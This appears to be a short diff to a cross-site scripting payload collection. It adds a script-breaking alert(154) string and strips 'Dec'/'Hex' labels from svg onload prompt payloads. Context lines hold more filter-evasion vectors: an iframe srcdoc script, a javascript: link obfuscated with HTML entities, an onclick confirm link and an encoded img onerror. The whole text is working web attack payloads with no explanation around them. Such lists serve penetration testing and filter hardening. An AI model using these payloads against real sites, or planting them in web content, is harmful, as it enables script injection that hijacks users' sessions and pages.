@@ -1,6 +1,7 @@
+‘>alert(154)</script><script/154=’;;;;;;;
 <a"/onclick=(confirm)()>Click Here!
-Dec: <svg onload=prompt%26%230000000040document.domain)>
-Hex: <svg onload=prompt%26%23x000000028;document.domain)>
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
 xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
 <--%253cimg%20onerror=alert(1)%20src=a%253e --!>
